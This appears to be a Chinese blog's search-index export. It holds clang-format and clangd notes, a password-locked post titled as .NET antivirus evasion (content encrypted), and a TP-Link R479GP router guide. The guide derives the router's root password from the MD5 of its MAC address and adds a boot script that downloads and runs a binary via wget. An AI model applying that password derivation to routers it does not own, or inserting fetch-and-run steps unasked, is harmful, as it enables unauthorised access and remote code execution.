class="attr">ObjCSpaceBeforeProtocolList:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">PenaltyBreakAssignment:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">PenaltyBreakBeforeFirstCallParameter:</span> <span class="number">19</span></span><br><span class="line"><span class="attr">PenaltyBreakComment:</span> <span class="number">300</span></span><br><span class="line"><span class="attr">PenaltyBreakFirstLessLess:</span> <span class="number">120</span></span><br><span class="line"><span class="attr">PenaltyBreakString:</span> <span class="number">1000</span></span><br><span class="line"><span class="attr">PenaltyBreakTemplateDeclaration:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">PenaltyExcessCharacter:</span> <span class="number">1000000</span></span><br><span class="line"><span class="attr">PenaltyReturnTypeOnItsOwnLine:</span> <span class="number">60</span></span><br><span class="line"><span class="attr">PointerAlignment:</span> <span class="string">Right</span></span><br><span class="line"><span class="attr">ReflowComments:</span>  <span class="literal">true</span></span><br><span class="line"><span class="attr">SortIncludes:</span>    <span class="literal">true</span></span><br><span class="line"><span class="attr">SortUsingDeclarations:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceAfterCStyleCast:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpaceAfterLogicalNot:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpaceAfterTemplateKeyword:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceBeforeAssignmentOperators:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceBeforeCpp11BracedList:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpaceBeforeCtorInitializerColon:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceBeforeInheritanceColon:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceBeforeParens:</span> <span class="string">ControlStatements</span></span><br><span class="line"><span class="attr">SpaceBeforeRangeBasedForLoopColon:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpaceInEmptyBlock:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpaceInEmptyParentheses:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpacesBeforeTrailingComments:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">SpacesInAngles:</span>  <span class="literal">false</span></span><br><span class="line"><span class="attr">SpacesInConditionalStatement:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpacesInContainerLiterals:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">SpacesInCStyleCastParentheses:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpacesInParentheses:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpacesInSquareBrackets:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">SpaceBeforeSquareBrackets:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">Standard:</span>        <span class="string">Auto</span></span><br><span class="line"><span class="attr">StatementMacros:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Q_UNUSED</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">QT_REQUIRE_VERSION</span></span><br><span class="line"><span class="attr">TabWidth:</span>        <span class="number">4</span></span><br><span class="line"><span class="attr">UseCRLF:</span>         <span class="literal">false</span></span><br><span class="line"><span class="attr">UseTab:</span>          <span class="string">Never</span></span><br><span class="line"><span class="attr">WhitespaceSensitiveMacros:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">STRINGIZE</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PP_STRINGIZE</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">BOOST_PP_STRINGIZE</span></span><br></pre></td></tr></table></figure><h2 id="❕注意事项"><a href="#❕注意事项" class="headerlink" title="❕注意事项"></a>❕<font color="red">注意事项</font></h2><ol><li>执行<code>bear -- make</code>时,如果你的源码没有变动过,会生成出一个空的<code>compile_commands.json</code> 文件,此时<code>clangd</code>的智能提示会失效,所以在提示失效时,只需要改动一下源码,再重新执行一下<code>bear -- make</code> 即可</li><li><code>clangd</code>配置和<code>Makefile</code>是不一样的,<code>clangd</code>只用于vscode的智能代码提示,头文件的自动查找,<code>Makefile</code>才是用来生成内核<code>ko</code>文件的东西</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 内核 </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.Net程序的通用免杀方案</title>
      <link href="/23332fba8d24/"/>
      <url>/23332fba8d24/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7dce2982a805df795af0756a4790dc514dab7ef0df7caa5d3dd79e4d53e2dd3e">803a1cceb27abaa40bf03fd0631e5335cd9a0b0ac1633e3439f76b0c398a15aadd2c402a63633b1779fc8f50b6db7263aeffcd7e267b747575b898345a85a3de6443711c11251cff7e1d60cc8c454013cd31e198e8d5cd3b33961367c1b103deca273d2212890c64c16bb6c88018a74dad7e6aea6a13e75f1f2ce3ba2e6223d3327493f03e9f9b9230e69d9b53d390e232f2bc2c801f9f7b183b7b49c18f2a0512d325fe52fffdb05c59abc39c638b3fb928efe4a40a89710bad2c49e73aa56c2bdb58d31f3e5bce146e8e98474151d83e0e6cdd7740cf6453679faaa385bab787fbb3074d115c7eea176d2e4dc54f4e77e29bbdd41eda761ccca570ba2ccfabedab44feea0b440b28bc76cb5140182d92021ad47abcd8ed79216d1ecdc0f68a523bab70bc8b4ce020f7ca2136433b4f46319f9e666a9476267dc8c63873182778f316d119df190090557f0d802d2b68f71b578c6973713f27726c2c23f11c2f113224423fbb75d21c4f3546f58fab8b55923a56398e0256df129b4588c416f340470d8d07ddcf8f691a07414fc7a0922e9831173ae07841b2c42aee820082b35a64611050e665e28b0c14d21c37356ff5246d74d0e6450e8b12012529794edba9818ffe15ee735b36bfd8e255f8d68e10450b6fe557cc327e22181d844ec5e6114e4d59f3a96fce79ee3cf060f1de36</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> .Net </tag>
            
            <tag> 免杀 </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让 TPLINK-R479GP-AC v2.0 开启 V2ray</title>
      <link href="/2fb2da18d11a/"/>
      <url>/2fb2da18d11a/</url>
      
        <content type="html"><![CDATA[<style>code {    color:#0099cc;}</style><h2 id="确定版本"><a href="#确定版本" class="headerlink" title="确定版本"></a>确定版本</h2><ul><li>基于硬件版本 TL-R479GP-AC v2.0，已测试通过</li><li>基于软件版本 1.1.4 Build 20200709 Rel.61296</li><li>查看版本请在设置中[系统工具]-&gt;[设备管理]-&gt;[软件升级]中查看</li></ul><hr><h2 id="获取ROOT权限"><a href="#获取ROOT权限" class="headerlink" title="获取ROOT权限"></a>获取ROOT权限</h2><ul><li>R479GP系统基于Openwrt 14.07开发,在设置中[系统工具]-&gt;[诊断工具]-&gt;[故障诊断]-&gt;[开启诊断模式] 即可打开ssh通道,默认端口为<code>33400</code>,如果默认端口不对,请参考配置文件</li><li><code>ssh root@192.168.0.1 -p 33400</code> 即可连接上路由器</li><li>root密码为LAN口mac地址 md5后的前8位</li><li>例子：<code>Mac下终端执行:echo -n &quot;410EEC2A5E1E&quot; | md5 </code></li><li>输出结果:<code>c6c89e99b3bd00fc6229a14b1ebd2748</code> 前8位,即<code>c6c89e99</code>为root密码</li><li>Linux下请把<code>md5</code>改为<code>md5sum</code></li><li>如果无法登录,请参考以下链接获取root权限</li><li>如何备份配置文件以及如何添加用户:[<a href="https://www.eatm.app/archives/395.html]">https://www.eatm.app/archives/395.html]</a></li></ul><hr><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><ul><li><p>CPU信息 <code>cat /proc/cpuinfo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">system type: Qualcomm Atheros QCA956X rev 0  </span><br><span class="line">machine: TP-LINK TL-R4299G 2.0  </span><br><span class="line">processor: 0  1.</span><br><span class="line">cpu model: MIPS 74Kc V5.0  </span><br><span class="line">BogoMIPS: 373.55  </span><br><span class="line">wait instruction: yes  </span><br><span class="line">microsecond timers: yes  </span><br><span class="line">tlb_entries: 32  </span><br><span class="line">extra interrupt vector: yes  </span><br><span class="line">hardware watchpoint: yes, count: 4, address/irw mask: [0x0000, 0x0ff8, &gt; 0x0ff8, 0x0ff8]  </span><br><span class="line">ASEs implemented: mips16 dsp  </span><br><span class="line">shadow register sets: 1  </span><br><span class="line">kscratch registers: 0  </span><br><span class="line">core: 0  </span><br><span class="line">VCED exceptions: not available  </span><br><span class="line">VCEI exceptions: not available</span><br></pre></td></tr></table></figure></li><li><p>Openwrt 版本 <code>cat /etc/openwrt_version</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DISTRIB_ID=&quot;OpenWrt&quot;  </span><br><span class="line">DISTRIB_RELEASE=&quot;Barrier Breaker&quot;  </span><br><span class="line">DISTRIB_REVISION=&quot;r95548&quot;  </span><br><span class="line">DISTRIB_CODENAME=&quot;barrier_breaker&quot;  </span><br><span class="line">DISTRIB_TARGET=&quot;ar71xx/generic&quot;  </span><br><span class="line">DISTRIB_DESCRIPTION=&quot;OpenWrt Barrier Breaker 14.07&quot;  </span><br><span class="line">DISTRIB_TAINTS=&quot;no-all no-ipv6 busybox&quot;  </span><br></pre></td></tr></table></figure></li><li><p>该版本貌似没有编译FPU支持，所以软件只支持<code>softloat</code></p></li><li><p>mtd信息 <code>cat /proc/mtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mtd0: 00030000 00010000 &quot;factoryBoot&quot;  </span><br><span class="line">mtd1: 00008000 00008000 &quot;factoryInfo&quot;  </span><br><span class="line">mtd2: 00008000 00008000 &quot;art&quot;  </span><br><span class="line">mtd3: 00030000 00010000 &quot;bootloader&quot;  </span><br><span class="line">mtd4: 00000600 00000600 &quot;tpHead&quot;  </span><br><span class="line">mtd5: 0014fa00 00010000 &quot;kernel&quot;  </span><br><span class="line">mtd6: 00ba0000 00010000 &quot;rootfs&quot;  </span><br><span class="line">mtd7: 00200000 00010000 &quot;rootfs_data&quot;  </span><br><span class="line">mtd8: 00020000 00010000 &quot;log&quot;  </span><br><span class="line">mtd9: 01000000 00010000 &quot;firmware&quot;  </span><br></pre></td></tr></table></figure></li><li><p>文件系统信息 <code>df -h</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Filesystem                Size      Used Available Use% Mounted on  </span><br><span class="line">rootfs                   61.8M    700.0K     61.1M   1% /  </span><br><span class="line">/dev/root                 9.3M      9.3M         0 100% /rom  </span><br><span class="line">tmpfs                    61.8M     11.9M     49.9M  19% /tmp  </span><br><span class="line">root                     61.8M    700.0K     61.1M   1% /tmp/root  </span><br><span class="line">overlayfs:/tmp/root      61.8M    700.0K     61.1M   1% /  </span><br><span class="line">/dev/mtdblock7            2.0M    724.0K      1.3M  35% /tmp/userconfig  </span><br><span class="line">tmpfs                   512.0K         0    512.0K   0% /dev  </span><br></pre></td></tr></table></figure></li><li><p>其中<code>/dev/mtdblock7            2.0M    724.0K      1.3M  35% /tmp/userconfig</code> 是 <code>唯一可写区</code>,也就是用户配置存放的地方，只有可怜的2M</p></li><li><p>对openwrt研究不深,不知道怎么把该分区在不重新编译固件的情况下加大,目前采用折中的办法是每次重启后,下载v2ray客户端到&#x2F;tmp&#x2F;v2ray目录下</p></li></ul><hr><h2 id="开启v2ray"><a href="#开启v2ray" class="headerlink" title="开启v2ray"></a>开启v2ray</h2><ul><li>把<a href="https://github.com/xxxNull/R479GP_V2ray/tree/main/v2ray">v2ray</a>目录下的v2ray,config.json,编辑好后传到自己的服务器上,自己编译v2ray请记得加上<code>GOMIPS=softfloat</code>开启软浮点</li><li>我用的是别人编译好的v2ray客户端,不放心的可以自己编译一份</li><li>config.json 自己配置好,我配置的是让路由器监听1080端口,我用sock5连上去</li><li>小工具:<a href="https://intmainreturn0.com/v2ray-config-gen">在线生成v2ray配置</a></li><li>v2ray客户端可以放在内网,也可以放在外网,我用的是一台内网ios设备当文件服务器</li><li>编辑<code>/tmp/userconfig/etc/rc.local</code>文件,加入开机后的命令<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Put your custom commands here that should be executed once</span></span><br><span class="line"><span class="comment"># the system init finished. By default this file does nothing.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">irq_balance</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">local</span> irqnum=`<span class="built_in">cat</span> /proc/interrupts | awk -F: <span class="string">&#x27;/eth/ &#123;print $1&#125;&#x27;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line"></span><br><span class="line">    [ <span class="string">&quot;1&quot;</span> == `<span class="built_in">cat</span> /proc/irq/<span class="variable">$&#123;irqnum&#125;</span>/smp_affinity` ] &amp;&amp; &#123;</span><br><span class="line">        <span class="built_in">local</span> core_num=`<span class="built_in">cat</span> /proc/cpuinfo | grep -w processor | awk <span class="string">&#x27;END&#123;print NR&#125;&#x27;</span>`</span><br><span class="line">        <span class="built_in">local</span> mask=`awk <span class="string">&quot;BEGIN&#123;f=lshift(1,<span class="variable">$core_num</span>)-1; print f&#125;&quot;</span>`</span><br><span class="line">        <span class="built_in">echo</span> `<span class="built_in">printf</span> %x <span class="variable">$mask</span>` &gt; /proc/irq/<span class="variable">$&#123;irqnum&#125;</span>/smp_affinity</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">irq_balance</span><br><span class="line"><span class="comment">#上面是机器原来的命令,下面是自己加的命令</span></span><br><span class="line"><span class="built_in">sleep</span> 60 <span class="comment"># 等待60秒让路由连上外网</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/v2ray</span><br><span class="line"><span class="built_in">cd</span> /tmp/v2ray</span><br><span class="line">wget http://192.168.0.199/v2ray <span class="comment"># 下载v2ray到路由上</span></span><br><span class="line">wget http://192.168.0.199/config.json <span class="comment">#下载配置</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/v2ray/v2ray</span><br><span class="line">/tmp/v2ray/v2ray -c /tmp/v2ray/config.json &amp;</span><br></pre></td></tr></table></figure></li><li>至此折腾结束,想让所有流量转发至v2ray上请自行配置iptables,接着往<code>rc.local</code>写命令即可</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> TPLINK </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
